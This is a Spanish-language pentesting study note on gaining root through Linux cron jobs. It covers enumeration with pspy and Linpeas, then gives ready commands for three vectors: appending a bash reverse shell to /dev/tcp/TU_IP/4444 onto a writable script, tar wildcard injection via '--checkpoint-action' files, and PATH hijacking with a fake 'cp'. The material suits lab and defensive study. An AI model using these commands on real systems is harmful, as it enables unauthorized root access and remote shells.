# Cron Jobs

## ¿Qué son?

Tareas programadas que el sistema ejecuta automáticamente en intervalos de tiempo. Si root ejecuta un script que tú puedes modificar, tienes root.

---

## Cómo encontrarlos

```bash
# Cron jobs del sistema
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Ver todos los directorios
ls -la /etc/cron*

# En tiempo real sin permisos especiales — el más útil
./pspy64
```

pspy es clave porque detecta cron jobs que no están en /etc/crontab.

---

## Leer /etc/crontab

```
* * * * *  root  /opt/scripts/backup.sh
│ │ │ │ │
│ │ │ │ └── día semana
│ │ │ └──── mes
│ │ └────── día mes
│ └──────── hora
└────────── minuto
* = siempre
```

Lo importante: quién lo ejecuta y qué script es.

---

## Los tres vectores

### Vector 1 — Script escribible directamente

```bash
# Compruebas permisos
ls -la /opt/scripts/backup.sh
# -rwxrwxr-x 1 root users ← puedes escribir

# Metes reverse shell
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Esperas el intervalo → shell como root
```

---

### Vector 2 — Wildcard injection

El script usa tar o rsync con `*`:

```bash
# Contenido de backup.sh
tar -czf backup.tar.gz /home/user/*
```

Creas archivos con nombres que parecen flags:

```bash
cd /home/user
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
```

tar expande el `*`, interpreta tus archivos como flags y ejecuta shell.sh como root.

---

### Vector 3 — PATH hijacking en cron

El script llama a un binario sin ruta absoluta:

```bash
# En backup.sh
cp archivo.txt /backup/    ← sin /bin/cp
```

Creas un binario falso en un directorio que va antes en el PATH:

```bash
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
```

El cron ejecuta tu `cp` falso como root.

---

## Flujo completo

```
1. cat /etc/crontab + pspy64   → qué ejecuta root
2. ls -la /ruta/script.sh      → ¿escribible?
3. cat script.sh               → ¿wildcards? ¿binarios sin ruta?
4. Según lo encontrado         → vector 1, 2 o 3
5. Esperar intervalo           → root
```

---

## Lo que marca Linpeas

```
╔══════════╣ Cron jobs
* * * * * root /opt/scripts/backup.sh

╔══════════╣ Writable scripts in cron
/opt/scripts/backup.sh   ← escribible + ejecutado por root = root garantizado
```

---

## Resumen mental

```
Encontrar  → /etc/crontab + pspy64
Analizar   → escribible / wildcards / binarios sin ruta
Explotar   → meter payload y esperar
Resultado  → root
```

## Referencias
- https://gtfobins.github.io
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs
